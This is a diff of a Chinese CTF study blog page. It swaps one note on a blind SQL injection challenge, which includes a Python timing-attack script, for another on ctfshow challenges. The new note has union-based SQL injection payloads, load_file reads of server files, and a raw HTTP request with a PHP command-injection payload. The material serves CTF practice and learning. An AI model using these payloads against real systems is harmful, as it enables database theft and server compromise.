@@ -19,22 +19,22 @@
   <meta name="author" content="aidemofashi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[NewStarCTF 2023 公开赛道]midsql看了wp，只能说fuzz过程应该是最重要的，不然fuzz都fuzz不明白完全不知道下一步该干嘛也许我记得一些注入方法，但是如果连注入点或者注入方式都fuzz不出来也是完全没用看了wp后发现原理都懂，那为什么总是要看wp才能写出题目？就是不会fuzz，自己写的脚本：   1234567891011121314151617181920212223">
+    <meta name="description" content="ctfshow_web14一开始也试了传c，但是就试到2，然后以为是源码绕过的，看wp发现是sql注入。再试到3就能自己发现这个页面了，，，，，，，，&#x2F;here_1s_your_f1ag.php按f12发现：    if(preg_match(‘&#x2F;information_schema.tables|information_schema.columns|linestring| |">
 <meta property="og:type" content="article">
-<meta property="og:title" content="note-22">
-<meta property="og:url" content="https://aidemofashi.github.io/2025/04/09/note-22/index.html">
+<meta property="og:title" content="note-23">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/04/10/note-23/index.html">
 <meta property="og:site_name" content="aidemofashi&#39;s blog">
-<meta property="og:description" content="[NewStarCTF 2023 公开赛道]midsql看了wp，只能说fuzz过程应该是最重要的，不然fuzz都fuzz不明白完全不知道下一步该干嘛也许我记得一些注入方法，但是如果连注入点或者注入方式都fuzz不出来也是完全没用看了wp后发现原理都懂，那为什么总是要看wp才能写出题目？就是不会fuzz，自己写的脚本：   1234567891011121314151617181920212223">
+<meta property="og:description" content="ctfshow_web14一开始也试了传c，但是就试到2，然后以为是源码绕过的，看wp发现是sql注入。再试到3就能自己发现这个页面了，，，，，，，，&#x2F;here_1s_your_f1ag.php按f12发现：    if(preg_match(‘&#x2F;information_schema.tables|information_schema.columns|linestring| |">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-04-09T07:53:17.000Z">
-<meta property="article:modified_time" content="2025-04-09T07:58:51.006Z">
+<meta property="article:published_time" content="2025-04-10T11:47:02.000Z">
+<meta property="article:modified_time" content="2025-04-10T11:49:57.663Z">
 <meta property="article:author" content="aidemofashi">
-<meta property="article:tag" content="sql">
+<meta property="article:tag" content="刷题note">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>note-22 - aidemofashi&#39;s blog</title>
+  <title>note-23 - aidemofashi&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="note-22"></span>
+            <span id="subtitle" data-typed-text="note-23"></span>
           
         </div>
 
@@ -211,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-04-09 15:53" pubdate>
-          2025年4月9日 下午
+        <time datetime="2025-04-10 19:47" pubdate>
+          2025年4月10日 晚上
         </time>
       </span>
     
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          424 字
+          481 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          4 分钟
+          5 分钟
         
       </span>
     
@@ -271,16 +271,25 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">note-22</h1>
+            <h1 id="seo-header">note-23</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="NewStarCTF-2023-公开赛道-midsql"><a href="#NewStarCTF-2023-公开赛道-midsql" class="headerlink" title="[NewStarCTF 2023 公开赛道]midsql"></a>[NewStarCTF 2023 公开赛道]midsql</h1><p>看了wp，只能说fuzz过程应该是最重要的，不然fuzz都fuzz不明白完全不知道下一步该干嘛<br>也许我记得一些注入方法，但是如果连注入点或者注入方式都fuzz不出来也是完全没用<br>看了wp后发现原理都懂，那为什么总是要看wp才能写出题目？<br>就是不会fuzz，<br>自己写的脚本：  </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>start=<span class="hljs-number">0</span><br>end=<span class="hljs-number">0</span><br>using=<span class="hljs-number">0</span><br>st = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&amp;\()*&#x27; +,-./:;&quot;</span><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&quot;http://9f146922-110f-45e5-a8b6-4b6fffbce466.node5.buuoj.cn:81/?id=&#x27;if(length(database())like(&#123;&#125;),sleep(3),1)&quot;</span><br><span class="hljs-comment"># for l in range (1,200):</span><br><span class="hljs-comment">#     url = &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(length(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name/**/like&#x27;items&#x27;)like/**/&#123;&#125;,sleep(3),1)&quot;.format(l)</span><br><span class="hljs-comment">#     start=time.time()</span><br><span class="hljs-comment">#     requests.get(url)</span><br><span class="hljs-comment">#     end=time.time()</span><br><span class="hljs-comment">#     using = end - start</span><br><span class="hljs-comment">#     if using &gt; 3:</span><br><span class="hljs-comment">#         print(&quot;tables length=&quot;,l,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#         time.sleep(5)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-comment">#     print(&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#     time.sleep(0.05)</span><br><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     for s in st :</span><br><span class="hljs-comment">#         url= &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like&#x27;items&#x27;),&#123;&#125;,1)like(&#x27;&#123;&#125;&#x27;),sleep(3),1)&quot;.format(i,s)</span><br><span class="hljs-comment">#         start=time.time()</span><br><span class="hljs-comment">#         requests.get(url)</span><br><span class="hljs-comment">#         end=time.time()</span><br><span class="hljs-comment">#         using= end - start</span><br><span class="hljs-comment">#         if using &gt; 3:</span><br><span class="hljs-comment">#             flag=flag + s</span><br><span class="hljs-comment">#             print(&quot;tables name=&quot;,flag,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#             r=1</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         print(&quot;using time=&quot;,using,&quot;string:&quot;,s)</span><br><span class="hljs-comment">#         time.sleep(0.05)</span><br><span class="hljs-comment">#         print(flag)</span><br><span class="hljs-comment">#         r=0</span><br><span class="hljs-comment">#     if r == 0:</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment">#id,name,price</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">177</span>) :<br>        url= <span class="hljs-string">&quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(ascii(substr((select/**/group_concat(name)/**/from/**/items),&#123;&#125;,1))like(&#x27;&#123;&#125;&#x27;),sleep(2),1)&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        start=time.time()<br>        requests.get(url)<br>        end=time.time()<br>        using= end - start<br>        <span class="hljs-keyword">if</span> using &gt; <span class="hljs-number">3</span>:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tables name=&quot;</span>,flag,<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;number string:&quot;</span>,i)<br>            r=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;string:&quot;</span>,<span class="hljs-built_in">chr</span>(s))<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>        r=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> r == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
-
-<p>参考wp:  <a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/134096958">https://blog.csdn.net/Myon5/article/details/134096958</a></p>
-
+                <h1 id="ctfshow-web14"><a href="#ctfshow-web14" class="headerlink" title="ctfshow_web14"></a>ctfshow_web14</h1><p>一开始也试了传c，但是就试到2，然后以为是源码绕过的，看wp发现是sql注入。<br>再试到3就能自己发现这个页面了，，，，，，，，<br>&#x2F;here_1s_your_f1ag.php<br>按f12发现：  </p>
+<blockquote>
+<p>if(preg_match(‘&#x2F;information_schema.tables|information_schema.columns|linestring| |polygon&#x2F;is’, $_GET[‘query’])){<br>die(‘@A@’);  </p>
+</blockquote>
+<p>禁用了information_schema猜是无列名注入</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">database</span>()<br><br><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>
+<p>字符注入</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>&amp;&amp;<span class="hljs-keyword">order</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span><br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure>
+<p>试出是字符注入</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">database</span>()<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>@@<span class="hljs-keyword">version</span><br><br>//alert(<span class="hljs-string">&#x27;10.2.26-MariaDB-log&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>mysql.innodb_table_stats<br>//alert(<span class="hljs-string">&#x27;gtid_slave_pos,content&#x27;</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(*)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>gtid_slave_pos<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>load_file<span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure>
+<p>试一下无列名注入</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>)<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span>#<br><br><span class="hljs-number">0</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<span class="hljs-comment">/**/</span><span class="hljs-selector-tag">from</span><span class="hljs-comment">/**/</span><span class="hljs-attribute">content</span><br><br>//回显(<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>,<span class="hljs-number">123</span>)无果<br></code></pre></td></tr></table></figure>
+<p>看wp:<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55923820/article/details/118783171">https://blog.csdn.net/m0_55923820/article/details/118783171</a><br>原来sql还能加载文件<br>学到了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">0/**/union/**/select/**/load_file(<span class="hljs-string">&#x27;/var/www/html/secret.php&#x27;</span>)<br><br>0/**/union/**/select/**/load_file(<span class="hljs-string">&#x27;/tmp/gtf1y&#x27;</span>)<br><br>0/**/union/**/select/**/load_file(<span class="hljs-string">&#x27;/tmp/gtf1y/real_flag_is_here&#x27;</span>)<br><br>0/**/union/**/select/**/load_file(<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span>)<br>//没想到是直接访问<span class="hljs-string">&#x27;/real_flag_is_here&#x27;</span><br>//alert(<span class="hljs-string">&#x27;ctfshow&#123;dd04abdc-9d55-4d0d-8d2d-f616f7b82caa&#125;&#x27;</span>)<br>```  <br><br>有无列明注入的版本wp，但我在我的环境没试出来：  <br>https://www.zxcms.com/content/3fcqbuf331l6p0.html<br><br><span class="hljs-comment"># ctfshow 红包题第二弹</span><br>有点牛逼了  <br><br>https://www.cnblogs.com/wssw/p/18115718  <br>前面的?&gt;意思是闭合前面的语句。  <br>&lt;?=是<span class="hljs-built_in">echo</span>()的别名用法。<br><br>```javascript<br>POST /?cmd=?%3E%3C?=`.%20/??p/p?p??????`; HTTP/1.1<br>Host: 6fd1fc97-dca5-4a94-8065-2622d4c7ed8d.challenge.ctf.show<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Content-Type: multipart/form-data; boundary=---------------------------114514<br>Accept-Encoding: gzip, deflate<br>Connection: keep-alive<br>Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>Content-Length: 245<br><br>-----------------------------114514<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;fileUpload&quot;</span>; filename=<span class="hljs-string">&quot;1.txt&quot;</span><br>Content-Type: text/plain<br><br><span class="hljs-comment">#! /bin/bash</span><br><br><span class="hljs-built_in">cat</span> /flag.txt<br>-----------------------------114514--<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -292,7 +301,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/sql/" class="print-no-link">#sql</a>
+        <a href="/tags/%E5%88%B7%E9%A2%98note/" class="print-no-link">#刷题note</a>
       
     </div>
   
@@ -304,8 +313,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>note-22</div>
-      <div>https://aidemofashi.github.io/2025/04/09/note-22/</div>
+      <div>note-23</div>
+      <div>https://aidemofashi.github.io/2025/04/10/note-23/</div>
     </div>
     <div class="license-meta">
       
@@ -317,7 +326,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年4月9日</div>
+          <div>2025年4月10日</div>
         </div>
       
       
@@ -349,18 +358,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/10/note-23/" title="note-23">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">note-23</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/04/06/note-21/" title="note-21">
-                        <span class="hidden-mobile">note-21</span>
+                      <a href="/2025/04/09/note-22/" title="note-22">
+                        <span class="hidden-mobile">note-22</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
